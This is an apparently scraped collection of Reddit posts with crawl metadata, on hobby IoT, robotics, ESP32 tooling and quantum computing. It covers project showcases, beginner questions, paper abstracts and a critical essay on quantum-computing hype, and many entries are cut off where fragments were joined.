"https://www.reddit.com/r/robotics/comments/1nw7a2y/how_does_the_us_realistically_pull_ahead_in/", "permalink": "https://reddit.com/r/robotics/comments/1nw7a2y/how_does_the_us_realistically_pull_ahead_in/", "is_self": true, "domain": "self.robotics", "tech_keywords": ["AI", "robotics", "AR"], "crawled_at": "2025-10-03T13:57:11.896154", "sentiment_score": {"vader_compound": 0.9752, "vader_positive": 0.131, "vader_neutral": 0.859, "vader_negative": 0.011, "textblob_polarity": 0.12284391534391534, "textblob_subjectivity": 0.3467684167684168, "overall_sentiment": "positive"}},

So far, I’ve always just stored files locally (in a folder), then hard-coded the path, and let Flutter call the Python script directly.  \nRepo (for reference): [https://github.com/Mahmoudbat/2d-cnc-printer](https://github.com/Mahmoudbat/2d-cnc-printer)\n\nBut I realize this isn’t how things are done in the industry. From what I understand, people use **APIs** to communicate between frontend and backend. I tried to look into APIs but I got lost — there are so many (REST, GraphQL, WebSockets, MQTT, etc.).\n\nHere’s where I’m stuck:\n\n* Are APIs basically just a way to transfer messages, like TCP/UDP already do?\n* If so, why not just use TCP or UDP directly?\n* I see frameworks like FastAPI, Django, Flask — do they all just implement REST under the hood?\n* Is an “API” just a concept, while the framework decides how it’s actually implemented?\n\nFor context: I’m joining a hackathon soon, and I need to process an image on my machine (Python) and represent it on a webpage (frontend).

It has real-time overview page and then other pages, where you can see historical and statistics datas, such as: Maximum / minimum level measured per month, week, day. There is historical table that consist of all the data ever recorded, as admin you can delete exact measurement that you like.\n\nIn graphs you can see the whole water level measured during different time periods. These line graphs can be download in .csv, .svg or .png format for further analysis or visualisation in 3rd party softwares. Watmonitor can be integrated to 3rd party systems directly using two JSON endpoints that are providing the latest data, or for a specific time period (from-to, or all from, or all to, or totally all). Working and tested with Node-RED, but also with Home Assistant. By integration you can get more notification features, or automatization for irrigation, home pump control etc.\n\nWatmonitor is translated to English, German, Russian, Slovak, Spanish, French language. There is available a online web interface of instance of Watmonitor, that you can test and use for free with your hardware based on Arduino, ESP32, ESP8266 (can't guarantee you will be only one writing the data, as is public interface). There are a lot of prototyping software and source codes available, including standard, but also low power or OTA modes. Possible to use ultrasonic distance sensors (JSN-SR04T, HC-SR04), or ToF laser sensors such as VL53L1X (TOF400C). Software available is for Arduino Core, but also for ESP-IDF framework with FreeRTOS and inter-task communication using Queues. Usable for absolute begineers, or more advanced users. There are some experiemntal implementations for LoRa (PPP), LoRaWAN, NB-IoT, Sigfox LPWAN connectivity aswell.  \n  \nBut as web interface is universal, can be used with any other sensor technology, or industrial bus, where you can configure and set the requeired HTTPS POST request pattern.

The MaTouch 1.28 board combines a touchscreen with a rotary encoder and can control up to 8 relays—perfect for managing lights, heaters, and other devices.\n\nWhat Makes It Cool:\n\n* Hands-on control through both touchscreen and encoder—perfect for DIY home automation systems.\n* The encoder lets you scroll menus, adjust values, and control relays—even with gloves on (huge plus for outdoor setups).\n* Timers: You can schedule devices to turn ON/OFF at specific times, which makes it great for appliances like heaters or lights.\n* I’ve designed a custom UI using SquareLine Studio and LVGL, which allowed me to create a neat and functional interface.\n\nHow It Works: I’ve set up 5 timers for different devices around the house, and the board controls everything. The best part is the automatic relay control, so I don’t have to worry about turning everything on and off manually. The RTC (Real-Time Clock) helps keep everything in sync!\n\nThe project is open-source, and all the files are available on GitHub. This gives you the flexibility to make modifications, whether it’s integrating Bluetooth or redesigning the UI for a different use case.\n\nI’m still experimenting with it, but so far it’s been a great addition to my setup.

I recently developed a tool to help me integrate new IoT devices more efficiently. When my boss asks me to integrate a new IoT device, I need to study the device’s documentation to extract the relevant commands (mainly Modbus in my case, but I also work with other protocols). To streamline this process, I built a tool that uses AI to analyze the documentation for me. Initially, the responses weren’t accurate, so I spent some time experimenting with RAG and prompt engineering. After analyzing and extracting the Modbus commands, the tool automatically sends the commands to the device for verification. Once the process is complete, it generates a library with device-specific functions that I can call, saving me the time of studying the documentation manually. I’m now thinking about how AI can help me with other parts of my job. How do you guys use AI to improve your workflow as engineers?

{"post_id": "1nd4kbb", "title": "Making voice AI actually conversational requires rethinking the entire flow", "content": "Built voice control for our smart home devices that actually understands context and doesn't need wake words for everything.\n\nTHE PROBLEM: Traditional IoT voice control is basically shouting commands at devices. \"Alexa, turn on living room lights.\" \"OK Google, set temperature to 72.\" It's functional but nobody wants to talk to their house like that constantly.\n\nWHAT ACTUALLY WORKS: Made the devices understand conversational context. Walk into a room and say \"too bright\" and it dims. Say \"actually a bit more\" and it adjusts. No wake words, no specific command syntax, just natural speech.\n\nThe key was moving processing to the edge. Each device runs a lightweight model that understands context from the room it's in. Kitchen device knows \"start the timer\" means oven timer. Bedroom device knows \"too cold\" means adjust thermostat.\n\nIMPLEMENTATION:\n\n- Local wake word detection on ESP32\n- Streaming audio to edge server on premises\n- Small LLM (3B params) running on local GPU\n- Device control via MQTT\n- Using agora for audio transport when controlling remotely\n\nThe remote control part was interesting. When you're away from home, the app streams your voice commands through WebRTC to your local network, processes them on your edge server, then controls devices. Keeps everything private, no cloud dependency.\n\nLatency is around 200ms for local commands, 400ms for remote. Power consumption increased by about 15% per device but worth it for the natural interaction.\n\nBiggest surprise was how much context matters. The same command means different things in different rooms at different times. \"Turn it off\" at night in bedroom means lights. Same command in kitchen during cooking means timer.\n\nAnyone else working on conversational IoT?

Edge device uses a hash of the database from the Merkle tree, like either the root node hash or subtree hashes, the Merkle trees hashes are managed by a central database server, the edge device only gets the hashes it needs and almost none of the data itself e.g. sql data. If the edge device receives data on its own, e.g. like its a oil rig sensor or something, data it picks up is preprocesses then hashed and compared to the Merkle tree data, if the hash is different you know the sensor discovered novel data and now you can request to send it back to the main server. Satellite link is slow, expensive and unreliable in places so you can optimize your bandwidth and operate better without a network.\n\nAll this rigmarole is to minimize calls back to the main server. This is highly useful for applications where network connectivity is intermittent, unlikely to be stable and when edge devices need to maintain access to a database securely offline, and any other case where server calls might need to be minimized \\*wink\\*.\n\nIs there problems I'm not seeing here??

Going live on GitHub in a few days!\n\n**The backstory:** During my internship at a HealthTech company, I had to manage firmware updates for a medicine distribution machine with 12+ ESP32 modules. Tools like ElegantOTA? Great for single devices, absolute nightmare for fleet management. Enterprise solutions? Either proprietary, expensive, or not available to regular developers.\n\nSo we said screw it and built our own.\n\n**What RoidOTA does differently:**\n\n* **Batch updates** \\- Update 50+ devices with one click instead of babysitting each one\n* **Device-specific firmware mapping** \\- Different devices, different firmware, no problem\n* **Easy rollbacks** \\- Because sometimes updates go sideways\n* **Fleet management** \\- Actually built for production use\n* **Zero physical access** \\- Remote everything\n* **100% open-source** \\- No paywalls, no restrictions\n\n**Why this matters:** As far as we can tell, this is the **only** open-source ESP device management platform available to the public. Everything else is either single-device focused or locked behind enterprise paywalls.\n\n**What's next:**\n\n* GitHub release in a few days (will post the link when it's live)\n* Looking for contributors who want to help improve RoidOTA as well as maintain it\n* Already planning deployments for other cool projects\n\n**For the developers:** If you've ever wanted to tear your hair out managing ESP32 updates in production, this one's for you.\n\n**For the hobbyists:** Scale up your projects without the headache.\n\n**For the curious:** Come check out what we've built and maybe contribute something awesome.\n\nWill post the GitHub link as soon as we go live.

{"post_id": "1ntnqfi", "title": "Quantum Hilbert space as a playground! Grover’s search visualized in Quantum Odyssey", "content": "Hey folks,\n\nI want to share with you the latest Quantum Odyssey update (I'm the creator, ama..) for the work we did since my last post, to sum up the state of the game. Thank you everyone for receiving this game so well and all your feedback has helped making it what it is today. This project grows because this community exists. It is now available on discount on Steam through the [Autumn festival](https://store.steampowered.com/app/2802710/Quantum_Odyssey/).\n\n# Grover's Quantum Search visualized in QO\n\nFirst, I want to show you something really special.  \nWhen I first ran [Grover’s search ](https://en.wikipedia.org/wiki/Grover%27s_algorithm)algorithm inside an early Quantum Odyssey prototype back in 2019, I actually teared up, got an immediate \"aha\" moment. Over time the game got a lot of love for how naturally it helps one to get these ideas and the gs module in the game is now about 2 fun hs but by the end anybody who takes it will be able to build GS for any nr of qubits and any oracle.\n\nHere’s what you’ll see in the first 3 reels:\n\n**1. Reel 1**\n\n* Grover on **3 qubits**.\n* The **first two rows** define an **Oracle** that marks **|011&gt;** and **|110&gt;**.\n* The rest of the circuit is the **diffusion operator**.\n* You can literally watch the **phase changes inside the Hadamards**... super powerful to see (would look even better as a gif but don't see how I can add it to reddit XD).\n\n**2. Reels 2 &amp; 3**\n\n* Same Grover on 3 with same Oracle.\n* Diff is a **single custom gate** encodes the entire diffusion operator from Reel 1, but packed into one **8×8 matrix**.\n* See the **tensor product** of this custom gate. That’s basically all Grover’s search does.\n\nHere’s what’s happening:\n\n* The **vertical blue wires** have amplitude **0.75**, while all the thinner wires are **–0.25**.\n* Depending on how the Oracle is set up, the **symmetry of the diffusion operator** does the rest.\n* In Reel 2, the Oracle adds **negative phase** to **|011&gt;** and **|110&gt;**.\n* In Reel 3, those **sign flips create destructive interference** everywhere **except** on **|011&gt;** and **|110&gt;** where the opposite happens.\n\nThat’s Grover’s algorithm in action, idk why textbooks and other visuals I found out there when I was learning this it made everything overlycomplicated. All detail is literally in the structure of the diffop matrix and so freaking obvious once you visualize the tensor product..\n\nIf you guys find this useful I can try to visually explain on reddit other cool algos in future posts.\n\n# What is Quantum Odyssey\n\nIn a nutshell, this is an interactive way to visualize and play with the full Hilbert space of anything that can be done in \"quantum logic\". Pretty much any quantum algorithm can be built in and visualized. The learning modules I created cover everything, the purpose of this tool is to get everyone to learn quantum by connecting the visual logic to the terminology and general linear algebra stuff.\n\nThe game has undergone a lot of improvements in terms of smoothing the learning curve and making sure it's completely bug free and crash free. Not long ago it used to be labelled as one of the most difficult puzzle games out there, hopefully that's no longer the case. (Ie. Check this review: [https://youtu.be/wz615FEmbL4?si=N8y9Rh-u-GXFVQDg](https://youtu.be/wz615FEmbL4?si=N8y9Rh-u-GXFVQDg) )\n\n**No background in math, physics or programming required**. Just your brain, your curiosity, and the drive to tinker, optimize, and unlock the logic that shapes reality. \n\nIt uses a **novel math-to-visuals framework** that turns all quantum equations into interactive puzzles. Your circuits are hardware-ready, mapping cleanly to real operations. This method is original to Quantum Odyssey and designed for true beginners and pros alike.\n\n# What You’ll Learn Through Play\n\n* **Boolean Logic** – bits, operators (NAND, OR, XOR, AND…), and classical arithmetic (adders). Learn how these can combine to build anything classical. You will learn to port these to a quantum computer.\n* **Quantum Logic** – qubits, the math behind them (linear algebra, SU(2), complex numbers), all Turing-complete gates (beyond Clifford set), and make tensors to evolve systems. Freely combine or create your own gates to build anything you can imagine using polar or complex numbers.\n* **Quantum Phenomena** – storing and retrieving information in the X, Y, Z bases; superposition (pure and mixed states), interference, entanglement, the no-cloning rule, reversibility, and how the measurement basis changes what you see.\n* **Core Quantum Tricks** – phase kickback, amplitude amplification, storing information in phase and retrieving it through interference, build custom gates and tensors, and define any entanglement scenario. (Control logic is handled separately from other gates.)\n* **Famous Quantum Algorithms** – explore Deutsch–Jozsa, Grover’s search, quantum Fourier transforms, Bernstein–Vazirani, and more.\n* **Build &amp; See Quantum Algorithms in Action** – instead of just writing/ reading equations, make &amp; watch algorithms unfold step by step so they become clear, visual, and unforgettable. Quantum Odyssey is built to grow into a full universal quantum computing learning platform.

On the right, a Bloch sphere shows the qubit as an arrow—its angle sets the mix between 0 and 1, and its twist shows the phase. You can set the qubit’s starting state with sliders for angle and phase, then add noise to see how it drifts and loses coherence. Extra controls let you add random jitters to mimic small errors. Numbers below the visuals show the actual matrix values and the result of a simulated measurement (probability collapse).\n\nAmplitude and frequency of noise: come from the physical environment, stray electromagnetic fields, thermal vibrations, or tiny imperfections in the circuit. Engineers try to minimize this by shielding the qubits, cooling them near absolute zero, and filtering signals.\n\nVariance (random jitter): comes from imperfect control pulses and tiny differences each time you run the circuit. To reduce this, they use extremely precise microwave pulses (for superconducting qubits) or laser pulses (for ion trap qubits).\n\nActive control: Scientists can shape the pulses (amplitude, phase, duration) to “steer” the qubit state exactly where they want on the Bloch sphere. They also run error-correction codes to cancel out random drift from noise.\n\n&gt;!reposted with 'more effort' for the mods", "author": "5K337Lord", "subreddit": "quantumcomputing", "score": 9, "upvote_ratio": 0.85, "num_comments": 2, "created_utc": "2025-09-22T10:12:07", "url": "https://www.reddit.com/r/QuantumComputing/comments/1nn95rb/i_made_an_interactive_representation_of_a_qubit/", "permalink": "https://reddit.com/r/QuantumComputing/comments/1nn95rb/i_made_an_interactive_representation_of_a_qubit/", "is_self": true, "domain": "self.QuantumComputing", "tech_keywords": ["AR"], "crawled_at": "2025-10-03T13:57:12.114234", "sentiment_score": {"vader_compound": -0.7901, "vader_positive": 0.035, "vader_neutral": 0.897, "vader_negative": 0.067, "textblob_polarity": -0.024716553287981856, "textblob_subjectivity": 0.38095238095238093, "overall_sentiment": "negative"}},

Traditional approaches to extending gate sets often require operating devices outside the ideal parameter regimes used to realize qubits, leading to increased control complexity while offering only a limited set of gates. Here we experimentally demonstrate a unified and versatile gate scheme capable of generating arbitrary two-qubit gates using only an exchange interaction and qubit driving on a superconducting quantum processor. We achieve high fidelities averaging 99.38% across a wide range of commonly used two-qubit unitaries, enabling precise multipartite entangled state preparation. Furthermore, we successfully produce a B gate, which efficiently synthesizes the entire family of two-qubit gates. Our results establish that fully exploiting the capabilities of the exchange interaction can yield a comprehensive and highly accurate gate set. With maximum expressivity, optimal gate time, demonstrated high fidelity and easy adaption to other quantum platforms, our unified control scheme offers the prospect of improved performance in quantum hardware and algorithm development.”", "author": "Earachelefteye", "subreddit": "quantumcomputing", "score": 16, "upvote_ratio": 1.0, "num_comments": 0, "created_utc": "2025-09-18T23:50:21", "url": "https://www.nature.com/articles/s41567-025-02990-x", "permalink": "https://reddit.com/r/QuantumComputing/comments/1nkadgf/efficient_implementation_of_arbitrary_twoqubit/", "is_self": false, "domain": "nature.com", "tech_keywords": ["AR"], "crawled_at": "2025-10-03T13:57:12.131871", "sentiment_score": {"vader_compound": 0.9843, "vader_positive": 0.177, "vader_neutral": 0.8, "vader_negative": 0.023, "textblob_polarity": 0.14087991718426499, "textblob_subjectivity": 0.569472049689441, "overall_sentiment": "positive"}},

Just look at the first few sentences of this post:\n\n&gt;Quantum computing is starting to make its way into financial workflows, and portfolio optimization is one of the areas seeing early traction.\n\n&gt;In a new white paper, [qBraid](https://www.linkedin.com/company/qbraid-official/) and [SC Quantum](https://www.linkedin.com/company/sc-quantum/) explore how quantum methods are being tested to support complex investment decisions. The paper highlights work from [IBM](https://www.linkedin.com/company/ibm/), [Amazon Web Services (AWS)](https://www.linkedin.com/company/amazon-web-services/) and [Goldman Sachs](https://www.linkedin.com/company/goldman-sachs/), and [J.P.

It points to practical ways these tools could support long-term returns, risk planning, and smarter asset allocation.\n\nSo, let's look at a few details and inconvenient facts here:\n\n* There is no such thing as a practically useful quantum computer, and therefore there is no practical \"quantum computing\" on a quantum computer, anywhere. Hard to see how this non-existent \"quantum computing\" could be \"starting to make it's way\" into anything.\n* The statement that \"quantum computing is starting to make its way into financial workflows\" is therefore, at the very least, IF you bend over backwards to find the most charitable interpretation possible for the term \"*starting to make its way*\", extremely misleading weasel-wording. A less charitable reading would simply call this a bald-faced lie.\n* But, hey, look at that, \"*portfolio optimization is one of the areas seeing early traction*.\" So, it's \"seeing early traction\", huh? What the eff is that supposed to mean?\n* Okay, let's see where these wild claims came from: There's a white paper that \"*explores how quantum methods are being tested*\". Well, now, that does give us a warm and fuzzy feeling, doesn't it. So, no, no integration of quantum computing into financial workflows. All we have is a white paper that \"explores\" what that could look like. If we had quantum computers, that is. Which we don't.\n* But wait, there's more!\n   * \"*This research connects directly to how large portfolios are managed in South Carolina.*\" Ahh, the research \"connects directly\", to portfolio management in South Carolina, even! Hint: Might it be helpful if some South Carolina congressmen and senators read this, huh? Translation: \"This research is vaguely related to some real important financial stuff happening in South Carolina\"\n   * Wait, we're not finished yet.

{"post_id": "1nfcplc", "title": "Assertion: There are no quantum computers in existence today, and there never may be.", "content": "This was a comment I posted in a thread below, but I think it might be instructive to put this up for discussion. \n\nTLDR: I contend that much of the current industry that has sprung up around the idea of a \"quantum computer\" is a smoke-and-mirrors show, with some politicians and a lot of investors being duped to invest into a fantastic pipe dream. More sadly, perhaps, a needlessly large number of students in particular are led to waste their time and bet their careers on a field that may yet turn out to be little more than a fantasy.\n\nAnd, yes, I am intentionally phrasing this somewhat stridently, but thoughtful responses will be appreciated.\n\nHere is what I would consider a fair description of the current state of the art:\n\nThere are a few quantum experiments and prototypes, and companies like IBM, Google, IonQ, and others operate devices with tens to a few hundred qubits. These devices can run *quantum circuits*, but they are noisy, error-prone, and limited in scale. The common term for current systems is *NISQ devices* (Noisy Intermediate-Scale Quantum). They are nothing but experimental testbeds and have little to nothing in common with the idea of a general-purpose computer as implied by the use of that term. As an aside, I would have much less of a problem with this entire field if people would just stick to labeling those devices as what they are. As is, using the term \"computer\" must be considered a less-than-benign sleight of hand at the very least, to avoid harsher words such as \"fraud\". \n\nAnyway, those NISQ devices can demonstrate certain small-scale algorithms, explore error-correction techniques, and serve as research platforms. But, critically, *they are of no practical use whatsoever*. As for demonstrations of \"quantum supremacy\" (another one of those cringey neologism; and yes, words have meaning, and meaning matters), all that those show is that quantum devices can perform a few very narrow, contrived tasks faster than classical supercomputers. But these tasks are not even remotely useful for practical computation, and I am really containing myself not to label them outright fraud. [Here ](https://eprint.iacr.org/2025/1237.pdf)is a [fun paper on the subject](https://eprint.iacr.org/2025/1237.pdf).\n\nHere's the deal: If we want the word \"quantum computer\" to retain any meaning at all, then it should be referring to a machine that can *reliably* execute a *wide variety of programs*, *scale* to problems beyond the reach of classical methods, and have *robust error-correction* and *predictable performance.* It turns out that no such machine exists nor is it even on the horizon. Actually useful applications for existing devices, like factoring, quantum chemistry, or optimization (you know, the kinds of things you typically see journalists babble about) are *far, far beyond the reach* of today’s hardware. There is no ETA for devices that would deliver on the lofty promises being bandied around in the community. It is worth noting that at least the serious parts of the industry itself usually hedge by calling today’s systems \"quantum processors\" or \"NISQ-era devices\", not true quantum computers.\n\nIf I want to be exceedingly fair, then I would say that current machines are to quantum computing what Babbage’s difference engine was to modern-day supercomputers. I really think that's still exceeding the case, since Babbage's machine was at least reliable. A fundamental breakthrough in architecture and scaling is still required. It is not even clear that physical reality allows for such a breakthrough. *So, this is not \"just an engineering problem\"*. The oft-quoted comparison of the problem of putting a man on the moon versus putting a man on the sun is apt, with the caveat that a lot of non-physicists do not appreciate what it would mean, and what it would require, to put a person on the surface of the sun. That's not an engineering problem, either.

Disregarding error rates, O(N) in QC could never beat the wall-clock times in GPUs. \n\nThe only way to get around this is to circumvent the Ω(N) barrier. This would mean having only target observables (drag/lift coefficients). But if you're taking numerous steps, where you would need the full measurements of the previous steps (hitting the Ω(N) barrier).

{"post_id": "1na0mhg", "title": "Turning Hilbert space into gameplay - Quantum Odyssey update", "content": "Hey folks,\n\nI want to share with you the latest[ Quantum Odyssey](https://store.steampowered.com/app/2802710/Quantum_Odyssey/) update (I'm the creator, ama..) for the work we did since my last post, to sum up the state of the game. Thank you everyone for receiving this game so well and all your feedback has helped making it what it is today. This project grows because this community exists.\n\nIn a nutshell, this is an interactive way to visualize and play with the full Hilbert space of anything that can be done in \"quantum logic\". Pretty much any quantum algorithm can be built in and visualized. The learning modules I created cover everything, the purpose of this tool is to get everyone to learn quantum by connecting the visual logic to the terminology and general linear algebra stuff.\n\nThe game has undergone a lot of improvements in terms of smoothing the learning curve and making sure it's completely bug free and crash free. Not long ago it used to be labelled as one of the most difficult puzzle games out there, hopefully that's no longer the case. (Ie. Check this review: [https://youtu.be/wz615FEmbL4?si=N8y9Rh-u-GXFVQDg](https://youtu.be/wz615FEmbL4?si=N8y9Rh-u-GXFVQDg) )\n\n**No background in math, physics or programming required**. Just your brain, your curiosity, and the drive to tinker, optimize, and unlock the logic that shapes reality. \n\nIt uses a **novel math-to-visuals framework** that turns all quantum equations into interactive puzzles. Your circuits are hardware-ready, mapping cleanly to real operations. This method is original to Quantum Odyssey and designed for true beginners and pros alike.\n\n# What You’ll Learn Through Play\n\n* **Boolean Logic** – bits, operators (NAND, OR, XOR, AND…), and classical arithmetic (adders). Learn how these can combine to build anything classical. You will learn to port these to a quantum computer.\n* **Quantum Logic** – qubits, the math behind them (linear algebra, SU(2), complex numbers), all Turing-complete gates (beyond Clifford set), and make tensors to evolve systems. Freely combine or create your own gates to build anything you can imagine using polar or complex numbers.\n* **Quantum Phenomena** – storing and retrieving information in the X, Y, Z bases; superposition (pure and mixed states), interference, entanglement, the no-cloning rule, reversibility, and how the measurement basis changes what you see.\n* **Core Quantum Tricks** – phase kickback, amplitude amplification, storing information in phase and retrieving it through interference, build custom gates and tensors, and define any entanglement scenario. (Control logic is handled separately from other gates.)\n* **Famous Quantum Algorithms** – explore Deutsch–Jozsa, Grover’s search, quantum Fourier transforms, Bernstein–Vazirani, and more.\n* **Build &amp; See Quantum Algorithms in Action** – instead of just writing/ reading equations, make &amp; watch algorithms unfold step by step so they become clear, visual, and unforgettable. Quantum Odyssey is built to grow into a full universal quantum computing learning platform. If a universal quantum computer can do it, we aim to bring it into the game, so your quantum journey never ends.", "author": "QuantumOdysseyGame", "subreddit": "quantumcomputing", "score": 92, "upvote_ratio": 0.95, "num_comments": 10, "created_utc": "2025-09-06T23:14:47", "url": "https://www.reddit.com/gallery/1na0mhg", "permalink": "https://reddit.com/r/QuantumComputing/comments/1na0mhg/turning_hilbert_space_into_gameplay_quantum/", "is_self": false, "domain": "reddit.com", "tech_keywords": ["AI", "quantum computing", "AR", "share"], "crawled_at": "2025-10-03T13:57:12.182471", "sentiment_score": {"vader_compound": 0.9895, "vader_positive": 0.098, "vader_neutral": 0.885, "vader_negative": 0.017, "textblob_polarity": 0.08823696145124715, "textblob_subjectivity": 0.48842592592592593, "overall_sentiment": "positive"}},

Optically addressable spin qubits form the foundation of an emerging generation of nanoscale sensors2,3,4,5,6,7. The engineering of these qubits has mainly focused on solid-state systems. However, fluorescent proteins, rather than exogenous fluorescent probes, have become the gold standard for in vivo microscopy because of their genetic encodability8,9. Although fluorescent proteins possess a metastable triplet state10, they have not been investigated as qubits. Here we realize an optically addressable spin qubit in enhanced yellow fluorescent protein. A near-infrared laser pulse enables triggered readout of the triplet state with up to 20% spin contrast. Using coherent microwave control of the enhanced-yellow-fluorescent-protein spin at liquid-nitrogen temperatures, we measure a (16 ± 2) μs coherence time under Carr–Purcell–Meiboom–Gill decoupling. We express the qubit in mammalian cells, maintaining contrast and coherent control despite the complex intracellular environment. Finally, we demonstrate optically detected magnetic resonance in bacterial cells at room temperature with contrast up to 8%.

I'd love to get your feedback on the approach and design.\n\n# Key Features\n\n* **Shift-and-Add Algorithm:** The multiplier uses the classic shift-and-add method.\n* **Cuccaro Adder Implementation:** The addition logic is based on the carry-ripple adder by Cuccaro et al., implemented using MAJ (Majority) and UMA (Un-Majority) gate logic.\n* **Custom Basis-Preserving Simulator:** I wrote a simple vectorized simulator that tracks the computational basis state as a single integer, making \"measurement\" an O(1) operation.\n* **MCX Decomposition:** The script can take a logical circuit and break down all MCX gates (with 3+ controls) into a sequence of Toffoli gates and SWAPs using the Barenco et al. method with \"clean\" ancilla qubits.\n* **Topology-Aware Depth Estimation:** You can define a qubit connectivity graph and get a rough depth estimate by calculating the SWAP chains needed to execute 2-qubit gates between non-adjacent qubits.\n* **Rich Metrics &amp; QASM Export:** The main script outputs a detailed report comparing the **logical** circuit metrics (ideal gates) versus the **decomposed** circuit metrics (physical-like gates).\n\n# Example Output\n\nHere’s the analysis for multiplying **9 x 9**:\n\n     9 × 9  =&gt; quantum=81   classical=81   logical_qubits=17 physical_qubits=18 time=99.097ms ✓\n     logical: gates={'TOTAL': 104, 'X': 4, 'CCX': 68, 'SWAP': 0, 'MCX_3+': 32} depth=98\n     decomposed: gates={'TOTAL': 136, 'X': 4, 'CCX': 132, 'SWAP': 0, 'MCX_3+': 0} depth=130 peak_virt_anc=1\n    \n\nAs you can see, decomposing the **32** complex `MCX_3+` gates increases the total gate count from 104 to **136** and the circuit depth from 98 to **130**. It also requires one extra ancilla qubit.\n\nThanks for checking it out and I´m happy about your feedback", "author": "scheitelpunk1337", "subreddit": "quantumcomputing", "score": 0, "upvote_ratio": 0.5, "num_comments": 2, "created_utc": "2025-08-26T06:06:47", "url": "https://www.reddit.com/r/QuantumComputing/comments/1n02p4a/quantum_multiplier_in_python_to_analyze_resource/", "permalink": "https://reddit.com/r/QuantumComputing/comments/1n02p4a/quantum_multiplier_in_python_to_analyze_resource/", "is_self": true, "domain": "self.QuantumComputing", "tech_keywords": ["AI", "AR", "python", "share"], "crawled_at": "2025-10-03T13:57:12.223353", "sentiment_score": {"vader_compound": 0.9756, "vader_positive": 0.071, "vader_neutral": 0.929, "vader_negative": 0.0, "textblob_polarity": 0.17134920634920636, "textblob_subjectivity": 0.49684126984126986, "overall_sentiment": "positive"}},

And if you take a look in the statevector they've initialized the circuit with |0000&gt;. When I did some digging(I used AI btw) I found out that the quantum hardware is often initialized in the lowest energy state that is |0&gt;. when the it is time for computation the software will decide when to apply the inversion gates based on the input and then pass it to the actual quantum circuit.

My plan is to use separate, pre-trained YOLOv8 models for each task, converted to **TensorFlow Lite** for on-device inference.\n\n**My Current Technical Assumptions:**\n\n* **Framework:** TensorFlow Lite for offline inference.\n* **Models:** I'll start with the smallest possible models (e.g., YOLOv8n-nano) for each task.\n* **Optimization:** I plan to use post-training quantization (likely INT8) during the TFLite conversion to minimize model sizes.\n\n**My Size Estimate Breakdown:**\n\n* TFLite Runtime Library: \\~3-5 MB\n* App Code &amp; Basic UI: \\~10-15 MB\n* **Remaining Budget for Models: \\~130 MB**\n\n**My Specific Questions for the Community:**\n\n1. **Is my overall approach sound?** Does using multiple, specialized TFLite models seem like the right way to handle multiple detection types offline?\n2. **Model Size Experience:** For those who've deployed YOLOv8n/s as TFLite models, what final file sizes are you seeing after quantization? (e.g., Is a quantized YOLOv8n for a single class around \\~2-3 MB?).\n3. **Hidden Overheads:** Are there any significant size overheads I might be missing? For example, does using the TFLite GPU delegate add considerable size? Or are there large native libraries for image pre-processing I should account for?\n4. **Optimization Tips:** Beyond basic quantization, are there other TFLite conversion tricks or model pruning techniques specific to YOLO that can shave off crucial megabytes without killing accuracy?\n\nI'm especially interested in hearing from anyone who has actually shipped an app with a similar multi-model, offline detection setup.

I've been struggling to reliably control a BLDC motor, and after multiple failed attempts and constant recalibrations, the ESCs just seem to be losing their minds losing calibration and generally being inconsistent.\n\nI’m trying to find an ESC (Electronic Speed Controller) that is robust, reliable, and perfectly suited for hobbyist microcontrollers.\n\nThe Specs I Need to Fix This Mess:\n\nBidirectional Control (Forward &amp; Reverse)**:** Crucial for my application. I need it to be able to smoothly transition and operate in both directions.\n\n1:1 Forward/Reverse Ratio: This is key. The motors must deliver the same maximum speed and torque in both forward and reverse. Many typical RC car/boat ESCs have a lower reverse power, which won't work for me.\n\nArduino/ESP32 PWM Compatibility. This is where I think my current setup fails. The ESC must reliably accept a PWM signal voltage of both 3.3V (for ESP32) AND 5V (for Arduino) without needing external level shifters.\n\nCurrent Rating: My motors require a decent current, so I’m looking for something in the 45A to 70A range.\n\nHas Anyone Used Maxynos ESCs?\n\nIn my search, I came across the Maxynos bidirectional ESCs (45A and 70A models) at maxynos.net. The specs suggest they meet the bidirectional and voltage compatibility requirements, and I’ve even seen a forum mention that they work with 3.3V PWM signals, which is encouraging.\n\nHas anyone in this community actually used the Maxynos 45A or 70A bidirectional ESCs with an Arduino or ESP32?\n\n  \nCan you confirm the 1:1 Forward/Reverse ratio is accurate?  \n  \nHow reliable is the calibration, and does it hold up over repeated power cycles?\n\nAny personal reviews or alternative ESC recommendations that tick all these boxes would be incredibly helpful!
